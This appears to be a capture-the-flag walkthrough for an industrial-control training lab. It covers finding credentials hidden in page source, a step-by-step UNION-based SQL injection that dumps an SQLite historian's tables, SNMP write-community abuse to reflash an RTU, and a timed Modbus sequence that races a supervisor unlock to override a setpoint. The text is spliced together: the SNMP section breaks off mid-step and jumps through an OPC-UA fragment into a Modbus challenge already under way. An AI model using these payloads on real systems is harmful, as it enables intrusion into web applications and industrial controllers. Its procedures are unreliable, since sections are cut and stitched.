Initial Access — Hacking into the IT Server (before the OT)

Before starting the OT challenges, we need to gain access to the industrial web portal running on the target device. This is the IT foothold: get into the corporate/engineering console first, then pivot to the OT protocols the rest of the challenges live on.

The web server is available at 10.0.1.1 on TCP port 80. Our first task is to discover a hidden page, inspect its source code, and find the login credentials.

We can do this using either a web browser or curl.

Step 1: Access the Web Server

Method 1 — Web Browser

Open your browser and visit:

http://10.0.1.1

Method 2 — Terminal

curl -i http://10.0.1.1

This connects to the web server and displays its HTTP response — a plain corporate login gate.

Step 2: Discover robots.txt

Websites use robots.txt to tell search-engine crawlers which paths they should or should not access. Sometimes it also reveals interesting paths we can investigate.

Method 1 — Web Browser

Visit:

http://10.0.1.1/robots.txt

Method 2 — Terminal

curl http://10.0.1.1/robots.txt

Look through the output. You should discover:

User-agent: *
Disallow: /control
Disallow: /hist-config

Disallow is not access control — it's a polite request to crawlers, enforced by nothing. Those paths are just as reachable as any other. /control is the one we want next.

Step 3: Open the Hidden Control Page

Method 1 — Web Browser

Visit:

http://10.0.1.1/control

Once the page loads, press:

Ctrl + U

This opens the page's HTML source code. Search through the source for the username and password — the rendered page shows an "engineering maintenance notice" with no visible credentials.

Method 2 — Terminal

Retrieve the page source directly:

curl -s http://10.0.1.1/control

Read through the HTML and look for the login credentials.

Step 4: Find the Login Credentials

The /control page hides the credentials in an HTML comment — invisible on the rendered page, but right there in the source:

<!-- maintenance window: shared engineering account still active - eng / Rec0ncile!42 ... -->

So the credentials are:

Field Value
Username eng
Password Rec0ncile!42

Why are we doing this? A webpage contains more than what we see on screen. Its HTML source can hold comments, hidden elements, and other information not visible in the normal browser view. Here, inspecting the source reveals the credentials needed to access the portal.

Step 5: Log In to the Portal

Method 1 — Web Browser

  1. Go to the console root http://10.0.1.1/.
  2. Enter the username eng.
  3. Enter the password Rec0ncile!42.
  4. Click Sign In — you land on the operator HMI (/hmi).

Method 2 — Terminal using curl

The login form posts to /login with the fields user and pass. The ! in the password must be URL-encoded as %21 in the form body.

# authenticate and save the session cookie
curl -i -c cookies.txt -X POST 'http://10.0.1.1/login' \
  -d 'user=eng&pass=Rec0ncile!42'

# use the session cookie to reach the protected operator HMI
curl -i -b cookies.txt http://10.0.1.1/hmi

The cookies.txt file stores the authenticated session, which you then present on protected pages.

What We Learned

  • robots.txt can reveal interesting website paths.
  • /control is discovered through robots.txt.
  • Ctrl + U opens the HTML source of a webpage.
  • HTML source inspection can reveal information hidden from the normal page view (here, credentials in a comment).
  • curl lets us perform the same investigation directly from the terminal.
  • Cookies maintain an authenticated web session.

Objective: Discover /control, inspect its source, recover the login credentials (eng / Rec0ncile!42), and access the industrial web portal — your IT foothold before the OT challenges.

Historian SQL Injection

Hard

Points: 250

Protocol: HTTP
Target: HIST-04 Process Historian
IP Address: 10.0.1.1
Port: 9000/tcp

The Story

HIST-04 is a Process Historian. Think of it as a computer that remembers what happens inside an industrial plant.

It stores information such as:

  • Tank water levels.
  • Chlorine concentration.
  • Water temperature.
  • Pressure and flow rate.
  • Other important plant readings.

The historian has a webpage called Data Browser. This page allows users to search through recorded process information.

But there is a problem!

The search box does not properly check what users type. Instead of treating the input as normal text, the database may treat it as part of an SQL command.

This weakness is called SQL Injection.

Your job is to discover the historian webpage, find the login credentials, access the Data Browser, exploit the SQL Injection vulnerability, and retrieve the hidden flag.

Part 2 — Exploit the SQL Injection Vulnerability

What Is SQL Injection?

Before continuing, let's understand what SQL Injection means.

Imagine a website has a search box.

Normally, you type:

WaterTank

The website searches the database for records related to WaterTank.

But what if you type something that looks like a database command?

The website might accidentally execute it instead of treating it as normal text.

That is SQL Injection.

In this challenge, we will use SQL Injection to:

  1. Check whether the search box is vulnerable.
  2. Find how many columns the database query returns.
  3. Discover the database tables.
  4. Discover the columns inside the hidden table.
  5. Retrieve the hidden flag.

Step 4 — Check Whether the Search Box Is Vulnerable

Before extracting anything, we need to confirm that SQL Injection actually works.

Query

Enter this into the source field:

' OR '1'='1

What does this query do?

Let's break it into small parts:

  • ' — Closes the text value that the application may have started.
  • OR — Tells the database that either condition can be true.
  • '1'='1 — Compares 1 with 1. This condition is always TRUE.

In simple words, we are telling the database:

"Show me the records if the source matches my search OR if 1 equals 1."

Since 1=1 is always true, the database may return many more records than a normal search.

What should you look for?

Compare the results with a normal search term.

If the number of records changes significantly, or records appear that do not match your search, the input may be injectable.

Show result and explanation

Expected observation

The query should cause the application to return a different set of records from a normal source search.

What does this tell us?

It suggests that the application is putting our input directly into its SQL query instead of safely treating it as text.

This means we may be able to control parts of the database query.

SQL Injection confirmed — continue to the next step.

Step 5 — Find the Number of Columns

Now that we have confirmed the injection point, we need to understand the structure of the original database query.

What is a column?

Think of a database table like an Excel spreadsheet.

  • A row is one complete record.
  • A column is one type of information.

For example:

ID SOURCE TEMPERATURE
1 Tank-A 28
2 Tank-B 30

Here, the table has three columns.

Why do we need the column count?

We are going to use something called UNION SELECT.

UNION SELECT combines the results of two database queries.

But there is one important rule:

Both queries must return the same number of columns.

For example, if the original query returns 10 columns, our injected query must also return 10 columns.

Query

Enter:

' UNION SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL--

What does this query do?

Let's break it down:

  • ' — Closes the original text value.
  • UNION SELECT — Tries to combine our query with the original query.
  • NULL — Represents an empty value. We use it as a placeholder because we do not know the column types yet.
  • Ten NULL values — Our attempt to match the original query's ten columns.
  • -- — Tells SQLite to ignore the remaining part of the original SQL statement.

If the query works without a column-count error, we have found the correct number of columns.

If it gives an error, adjust the number of NULL values until the query works.

Show result and explanation

Expected observation

When the number of columns matches the original query, the UNION query should execute without a column-count mismatch error.

What does this tell us?

We have identified the number of columns required by the original query.

We can now use those column positions to retrieve information from other database tables.

Step 6 — Discover the Database Tables

Now we know how many columns the original query returns.

The next question is:

What tables exist inside the database?

Remember, a database can contain many tables, just like an Excel workbook can contain multiple sheets.

The backend in this challenge uses SQLite.

SQLite has a special table called sqlite_master.

This table stores information about the database structure, including table names and their creation statements.

Query

Enter:

' UNION SELECT name, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL FROM sqlite_master WHERE type='table'--

What does this query do?

Let's break it down:

  • ' — Closes the original text value.
  • UNION SELECT — Combines our results with the original query.
  • name — Asks SQLite to show the names of database objects.
  • NULL — Fills the remaining columns because our original query expects ten columns.
  • FROM sqlite_master — Reads information from SQLite's database structure table.
  • WHERE type='table' — Shows only objects that are tables.
  • -- — Ignores the remaining part of the original query.

In simple words:

"Go through the database's list of tables and show me their names."

Show result and explanation

Expected observation

The result should contain the names of tables stored in the database.

Look carefully for a table named:

flags

What does this tell us?

The flags table looks interesting because it does not belong to the normal process-history data we expected.

It may contain the hidden challenge flag.

We now need to discover what information is stored inside this table.

Step 7 — Discover the Columns Inside the Flags Table

We found a table called flags.

But we do not yet know what information it contains.

For example, it might have columns such as:

id flag description
1 hidden-value challenge flag

We need to confirm the actual column names.

Query

Enter:

' UNION SELECT sql, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL FROM sqlite_master WHERE type='table' AND name='flags'--

What does this query do?

Let's understand it:

  • sql — Requests the SQL statement used to create the table.
  • FROM sqlite_master — Reads the database structure information.
  • WHERE type='table' — Searches only for tables.
  • AND name='flags' — Selects only the table named flags.
  • NULL — Fills the remaining columns.
  • -- — Ignores the rest of the original query.

Remember that sqlite_master stores the original CREATE TABLE statement.

For example, a table might have been created using:

CREATE TABLE flags (
    id INTEGER,
    flag TEXT,
    description TEXT
);

This tells us that the table has three columns:

  • id
  • flag
  • description

Our actual database may have a different definition, so read the result carefully.

Show result and explanation

Expected observation

The result should show the CREATE TABLE statement for the flags table.

For example:

CREATE TABLE flags (
    id INTEGER,
    flag TEXT,
    description TEXT
)

What does this tell us?

We now know the column names and their order.

For this example:

  1. id stores the record ID.
  2. flag stores the hidden flag.
  3. description stores a description.

We can now use these column names to retrieve the actual data.

Step 8 — Retrieve the Hidden Flag

We have completed the important discovery steps:

  • We found an injectable search field.
  • We identified the required column count.
  • We discovered the database tables.
  • We found the flags table.
  • We identified its columns.

Now we can retrieve the contents of the table.

Query

Enter:

' UNION SELECT id, flag, description, NULL, NULL, NULL, NULL, NULL, NULL, NULL FROM flags--

What does this query do?

Let's break it down:

  • ' — Closes the original text value.
  • UNION SELECT — Combines our results with the original query.
  • id — Retrieves the record ID.
  • flag — Retrieves the hidden flag.
  • description — Retrieves the description.
  • NULL — Fills the remaining seven columns.
  • FROM flags — Reads the information from the flags table.
  • -- — Ignores the remaining part of the original query.

In simple words:

"Open the flags table and show me the ID, flag, and description."

Show result and explanation

Expected result

The Data Browser should display records from the flags table.

Look for the value in the flag column.

That value is the challenge flag.

What does this tell us?

We successfully used SQL Injection to access information from a table that was not intended to be available through the normal Data Browser search.

Challenge completed!

What You Learned

By completing this challenge, you learned:

  1. robots.txt discovery: How to investigate a web server and find paths that are not directly linked on its homepage.
  2. Web enumeration: How to follow clues from one webpage to another.
  3. SQL Injection: How unsafe input handling can allow users to change a database query.
  4. Testing an injection point: How a simple condition such as '1'='1 can help identify a vulnerable search field.
  5. UNION SELECT: How to combine results from different database queries.
  6. Column counting: Why both sides of a UNION query need the same number of columns.
  7. SQLite enumeration: How sqlite_master can reveal database tables and their definitions.
  8. Data extraction: How knowing a table's structure helps retrieve its contents.

Main Lesson

A search box should only accept search values. It should never allow users to change the SQL commands executed by the application.

The main security problem in this challenge is unsanitized user input.

A safer application uses parameterized SQL queries. These keep user input separate from SQL commands, preventing input from being interpreted as executable SQL.

Also, robots.txt should never be used to protect sensitive webpages. Login credentials and configuration information must be properly protected.

In a real industrial environment, a process historian may contain sensitive information about plant operations. Protecting its database is important because attackers could use exposed information to understand the plant and plan further attacks.

02

Field Device Recovery

Hard

Points: 250

Protocol: SNMP (v2c)
Target: RTU-07
IP Address: 10.0.1.1
Port: 161/UDP
Toolkit module: None — use standard Net-SNMP tools.

The Story

RTU-07 is a Remote Terminal Unit (RTU) used in an industrial environment.

Think of an RTU as a small computer that communicates with industrial equipment and collects information from the plant.

After an incident, RTU-07 starts behaving incorrectly. Its firmware image appears to be corrupted.

The device reports:

[IMAGE CORRUPT - recovery required]

Luckily, the device has its own recovery system that can be controlled using SNMP.

However, there is a problem: we don't know the password required to perform the recovery operation.

The device has stored this password inside one of its SNMP information fields.

Your job is to:

  1. Check whether the device is unhealthy.
  2. Find the SNMP write community.
  3. Enter recovery mode.
  4. Restore the last-known-good firmware image.
  5. Return the device to normal mode.
  6. Verify that the device is healthy.
  7. Retrieve the recovery flag.

About the Protocol — SNMP

SNMP stands for Simple Network Management Protocol.

It is used to monitor and manage network devices.

For example, administrators can use SNMP to:

  • Check whether a device is running.
  • Read device information.
  • Monitor network interfaces.
  • Check system health.
  • Change certain device settings.

SNMP uses information fields called OIDs.

What is an OID?

OID stands for Object Identifier.

Think of an OID as an address that points to a particular piece of information inside a device.

For example:

1.3.6.1.2.1.1.1.0

This OID points to sysDescr, which contains the device description.

Two important SNMP commands

We will mainly use two commands.

1. snmpget

Used to read information from a device.

Example:

snmpget -v2c -c public 10.0.1.1 1.3.6.1.2.1.1.1.0

2. snmpset

Used to change information on a device.

Example:

snmpset -v2c -c COMMUNITY 10.0.1.1 OID i VALUE

Understanding the command options

Option Meaning
-v2c Uses SNMP version 2c.
-c public Specifies the SNMP community string.
10.0.1.1 IP address of the target device.
OID Identifies the information we want to read or change.
i Tells SNMP that the value being written is an integer.

What is a community string?

A community string works like a password for SNMP access.

In this challenge, we have two community strings:

  • public — Allows us to read information.
  • r3c0v3ry-07 — Allows us to perform recovery operations.

Understanding the Recovery OIDs

The device provides a special recovery section in its SNMP database.

Its base OID is:

1.3.6.1.4.1.42424

Here are the important OIDs:

OID Name Meaning
.1.0 fwRecoveryMode Controls recovery mode. 1 = recovery mode, 0 = normal mode.
.2.0 fwRunningImage Shows the firmware image currently running.
.3.0 fwLastGoodImage Shows the last-known-good firmware image.
.4.0 fwRestoreImage Used to select the firmware image to restore.
.5.0 deviceHealth 1 = healthy, 0 = unhealthy.
.9.0 recoveryFlag Contains the recovery flag after successful recovery.

Important: The firmware image values are integers, not strings. Therefore, we must use i when writing the image number.

Step 1 — Check Whether the RTU Is Unhealthy

Before changing anything, we need to understand the current condition of the device.

We will use snmpget to read four values:

  1. Device description.
  2. Device health.
  3. Currently running firmware image.
  4. Last-known-good firmware image.

Commands

Run these commands in your terminal:

snmpget -v2c -c public 10.0.1.1 1.3.6.1.2.1.1.1.0

snmpget -v2c -c public 10.0.1.1 1.3.6.1.4.1.42424.5.0

snmpget -v2c -c public 10.0.1.1 1.3.6.1.4.1.42424.2.0

snmpget -v2c -c public 10.0.1.1 1.3.6.1.4.1.42424.3.0

What do these commands do?

Command 1 — Read the device description

snmpget -v2c -c public 10.0.1.1 1.3.6.1.2.1.1.1.0
  • snmpget asks the device for information.
  • -v2c selects SNMP version 2c.
  • -c public uses the read community.
  • 10.0.1.1 is the RTU's IP address.
  • 1.3.6.1.2.1.1.1.0 points to sysDescr.

This tells us what firmware or system description the device is reporting.

Command 2 — Check device health

snmpget -v2c -c public 10.0.1.1 1.3.6.1.4.1.42424.5.0

This reads deviceHealth.

  • 0 means unhealthy.
  • 1 means healthy.

Command 3 — Check the running firmware

snmpget -v2c -c public 10.0.1.1 1.3.6.1.4.1.42424.2.0

This reads fwRunningImage.

It tells us which firmware image the device is currently using.

Command 4 — Check the last-good firmware

snmpget -v2c -c public 10.0.1.1 1.3.6.1.4.1.42424.3.0

This reads fwLastGoodImage.

It tells us which firmware image the device considers safe and working.

iso.3.6.1.4.1.42424.2.0 = INTEGER: 9001

Step 2 — Find the SNMP Write Community

We can read information using the public community, but we need a different community string to change the device's settings.

Where can we find it?

The challenge tells us that the write community is stored inside sysContact.

What is sysContact?

sysContact is a standard SNMP field that normally stores contact information about the person or team responsible for managing a device.

For example, it might contain:

Network Administrator

But in this challenge, the device has also stored its SNMP write community string there.

Command

snmpget -v2c -c public 10.0.1.1 1.3.6.1.2.1.1.4.0

What does this command do?

  • snmpget reads information from the device.
  • -v2c selects SNMP version 2c.
  • -c public uses the read community.
  • 10.0.1.1 is the target RTU.
  • 1.3.6.1.2.1.1.4.0 points to sysContact.

In simple words:

"Read the contact information stored inside the RTU."

Show result and explanation

Actual Result

iso.3.6.1.2.1.1.4.0 = STRING: "OT maintenance <noc@sysrupt.local>; SNMP write community: r3c0v3ry-07"

Understanding the result

The output contains two pieces of information:

  • Contact: OT maintenance <noc@sysrupt.local>
  • SNMP write community: r3c0v3ry-07

We have now discovered the community string required to perform SNMP SET operations.

Our write community is:

r3c0v3ry-07

Keep this value. We will use it in the next steps.

Step 3 — Enter Recovery Mode

Now that we have the write community, we can start the recovery process.

But before restoring the firmware, we must put the device into recovery mode.

What is recovery mode?

Think of recovery mode as a special maintenance mode.

The device temporarily leaves its normal operating mode so that recovery operations can be performed.

According to the challenge:

  • 0 = Normal run mode.
  • 1 = Recovery mode.

We need to change fwRecoveryMode from 0 to 1.

Command

snmpset -v2c -c r3c0v3ry-07 10.0.1.1 1.3.6.1.4.1.42424.1.0 i 1

What does this command do?

Let's break it down:

  • snmpset — Changes a value on the device.
  • -v2c — Uses SNMP version 2c.
  • -c r3c0v3ry-07 — Uses the write community we discovered in Step 2.
  • 10.0.1.1 — Target RTU.
  • 1.3.6.1.4.1.42424.1.0 — Points to fwRecoveryMode.
  • i — Tells SNMP that we are writing an integer.
  • 1 — Sets recovery mode to ON.

In simple words:

"Tell the RTU to enter recovery mode."

Show result and explanation

Actual Result

iso.3.6.1.4.1.42424.1.0 = INTEGER: 1

Understanding the result

The device returned:

INTEGER: 1

This means the value was successfully changed to 1.

The RTU is now in recovery mode.

We can now restore the firmware image.

Step 4 — Restore the Last-Known-Good Firmware

Remember what we discovered in Step 1?

Firmware Image ID
Current corrupted image 9001
Last-known-good image 341

We need to restore image 341.

Important: Why don't we write to fwRunningImage?

The fwRunningImage OID is read-only.

That means we cannot directly change its value.

Instead, the device provides another OID called fwRestoreImage.

We write the firmware image number into fwRestoreImage, and the device performs the restoration.

Command

snmpset -v2c -c r3c0v3ry-07 10.0.1.1 1.3.6.1.4.1.42424.4.0 i 341

What does this command do?

  • snmpset — Writes a value to the device.
  • -v2c — Uses SNMP version 2c.
  • -c r3c0v3ry-07 — Uses the write community.
  • 10.0.1.1 — Target RTU.
  • 1.3.6.1.4.1.42424.4.0 — Points to fwRestoreImage.
  • i — Specifies that the value is an integer.
  • 341 — Selects the last-known-good firmware image.

In simple words:

"Tell the RTU to restore firmware image 341."

Why do we use i instead of s?

SNMP supports different data types.

  • i means Integer.
  • s means String.

Even though 341 looks like a firmware version, the device stores it as an integer.

Therefore, we must use:

i 341

Not:

s 341
Show result and explanation

Actual Result

iso.3.6.1.4.1.42424.4.0 = INTEGER: 0

Understanding the result

The device accepted the SET operation.

The fwRestoreImage OID is write-only. It is designed to accept a restore request, and its read-back value is always 0.

So seeing:

INTEGER: 0

does not mean that the firmware restoration failed.

We must verify the actual running image later.

Step 5 — Return the RTU to Normal Mode

We have requested the firmware restoration.

Now we need to take the device out of recovery mode.

Remember:

  • 1 = Recovery mode.

About the Protocol — OPC-UA-lite

OPC UA is a communication protocol used by industrial systems to exchange information between devices and software.

The protocol supports three main operations:

Step 2: Browse the Root Node

Hint

A BROWSE request uses opcode 0x02, followed by the two-byte NodeId. The Root node has NodeId 0x0000.

The response contains a status byte, a child count, and each child's NodeId and name.

Show command

def browse(sock, node_id):
    sock.sendall(bytes([0x02, (node_id >> 8) & 0xff, node_id & 0xff]))
    return sock.recv(1024)

def decode_browse(response):
    status, count = response[1], response[2]
    children, offset = [], 3

    for _ in range(count):
        node_id = (response[offset] << 8) | response[offset + 1]
        name_len = response[offset + 2]
        name = response[offset + 3:offset + 3 + name_len].decode(
            "utf-8", "replace"
        )

        children.append((node_id, name))
        offset += 3 + name_len

    return status, children

status, root_children = decode_browse(browse(sock, 0x0000))
print("ROOT children:", root_children)

What the code does

Part 1: Send a BROWSE request

  • def browse(sock, node_id): — Defines a function that requests the children of a specified node.
  • 0x02 — The opcode that tells the server we want to browse a node.
  • (node_id >> 8) & 0xff — Extracts the higher eight bits of the NodeId.
  • node_id & 0xff — Extracts the lower eight bits of the NodeId.

The original rod position is 10, and our target is 100.

Step 2: Understand the Unlock System

What are we doing?

Before changing the maintenance rod, we must unlock the supervisor lock.

First, try changing the rod without unlocking it. Then request the unlock and check the remaining time.

Commands

./bin/sysrupt modbus write 21 100

./bin/sysrupt modbus write 20 1

./bin/sysrupt modbus read-input 72 1

What is happening?

  • Register 20 controls the unlock.
  • Writing 1 requests an unlock.
  • Register 72 shows how much unlock time remains.
  • Register 21 controls the maintenance rod.
Show result and explanation

When we try changing the rod without unlocking it, the system rejects the request.

This happens because the maintenance rod is protected.

The unlock lasts approximately 2 seconds, so we must change the rod quickly after opening the lock.

Step 3: Understand the Two Important Problems

There are two things that can make our attempt fail.

Problem 1: The unlock needs a fresh signal

The unlock works only when its value changes from:

0 → 1

This is called a rising edge.

Think of it like pressing a button. If the button is already ON, sending ON again does not create a new button press.

So, before unlocking, we must set the register back to 0.

./bin/sysrupt modbus write 20 0

Now the next write of 1 creates a fresh unlock signal.

Problem 2: The unlock window is very short

The unlock lasts only around 2 seconds.

Typing separate commands manually can take too long. By the time we send the rod command, the unlock may have expired.

Solution: Use the toolkit's sequence feature to execute all commands in the correct order over one connection.

Step 4: Create the Timed Sequence

What are we doing?

We are creating a JSON file containing the commands needed to perform the override.

The sequence will:

  1. Turn the unlock OFF.
  2. Turn the unlock ON.
  3. Set the maintenance rod to 100.
  4. Confirm the system legitimised the new position (IR73 = 100).
  5. Hold the position for ~10 seconds on the same connection.
  6. Read the flag from IR48.

Important: the badge pauses the plant simulation whenever no client is connected. The ~10 s stability hold only advances while a connection stays open, so the hold reads and the flag read must be steps in this one sequence — the toolkit runs every step over a single persistent connection. Doing them as separate commands after a shell sleep opens new connections and the hold never completes.

Create the file

nano maint.seq.json

Paste the following:

{
  "name": "maint-override",
  "steps": [
    { "command": "modbus write 20 0" },
    { "command": "modbus write 20 1", "deadline_ms": 1000 },
    { "command": "modbus write 21 100", "deadline_ms": 1800 },
    { "command": "modbus verify 73 100 --input", "delay_before_ms": 300 },
    { "command": "modbus read-input 74 1", "delay_before_ms": 2600 },
    { "command": "modbus read-input 74 1", "delay_before_ms": 2600 },
    { "command": "modbus read-input 74 1", "delay_before_ms": 2600 },
    { "command": "modbus read-input 48 16", "delay_before_ms": 2600 }
  ]
}

Save the file.

Understand the sequence

Command Purpose
modbus write 20 0 Resets the unlock.
modbus write 20 1 Opens the supervisor lock (fresh rising edge).
modbus write 21 100 Moves the maintenance rod to 100.
modbus verify 73 100 --input Confirms the loop legitimised it (IR73 = 100).
modbus read-input 74 1 (×3) Keeps the connection active through the ~10 s hold.
modbus read-input 48 16 Reads the flag once the hold completes.

What are the timing options?

  • deadline_ms: Maximum time allowed for that step after the sequence starts.
  • delay_before_ms: Waits before executing that step.

The three read-input 74 steps plus the final read are spaced ~2.6 s apart so the single connection stays open for the full ~10 s hold. Keeping one connection open is what lets the stability timer run to completion — the final read-input 48 then returns the flag.

Validate and execute the sequence

First, check whether the JSON file is correct:

./bin/sysrupt sequence validate maint.seq.json

Then execute it:

./bin/sysrupt sequence run maint.seq.json
Show result and explanation

The important command to check is:

modbus write 21 100

We want to see:

Protocol acknowledgement received

This means the rod write was accepted by the Modbus device.

If you see:

Request sent (no positive response)

The write was rejected. The unlock may not have opened correctly or may have expired.

Step 5: Check Whether the System Accepted the New Position

What are we doing?

Changing the rod to 100 does not automatically mean the system has accepted the change.

The background reconciliation loop checks the rod position while the unlock is open and, if it is, promotes 100 to the authorised value. This is the modbus verify 73 100 --input step inside the sequence — you do not run it separately (a standalone command would open a new connection). It confirms input register 73 now reads 100.

Show result and explanation

The expected result is:

IR73 = 100

This means the system now treats 100 as the authorised rod position instead of the original value 10.

Step 6: Read the Flag from the Sequence Output

What are we doing?

Because the hold reads and the flag read are the last steps of the same sequence, you do not run any separate commands here — the single sequence run above already held the position for ~10 s on one connection and read IR48 at the end. You just read its output.

What to look for in the sequence output

  • Step modbus write 21 100 → Protocol acknowledgement received (rod write accepted).
  • Step modbus verify 73 100 --input → Observed state change confirmed (IR73 is now 100: the reconciliation loop legitimised the override).
  • Final step modbus read-input 48 16 → Challenge completion confirmed, with the flag on its ascii: line.
Show result and explanation

Once the override has been held stable for ~10 s on the one connection, the challenge publishes the flag in IR48 and the final step reports completion:

[8] OK  modbus read-input 48 16  ->  Challenge completion confirmed
ascii: wired{t0ct0u_r0d_0verr1d3_pwn}

If the final step is still empty, the hold was interrupted (a dropped connection, or the sequence was too short). Re-run the whole sequence — it must complete on one connection without a shell sleep splitting it.

Important Things to Remember

  1. Always write 0 to HR20 before writing 1. The unlock needs a fresh rising edge.
  2. The unlock stays active for only approximately 2 seconds.
  3. Use the sequence file instead of manually typing commands one by one.
  4. Check IR73 to confirm that the new rod position was accepted.
  5. Do not change the rod after it has been accepted.
  6. Wait approximately 10 seconds before checking the solve status.
  7. Avoid repeatedly opening the unlock. More than 6 rising edges within approximately 2 seconds can trigger a temporary maintenance lockout.

What We Learned

  • Modbus Holding Registers: Used to control equipment, such as the supervisor unlock and maintenance rod.
  • Input Registers: Used to read information, such as the unlock timer and solve status.
  • Rising Edge: A signal change from 0 to 1.
  • TOCTOU: A timing problem where something is checked at one moment but changes before the operation finishes.
  • Sequence Engine: Allows multiple commands to execute in a fixed order over one connection.
  • State Verification: Always check whether the system accepted a change instead of trusting only the write response.
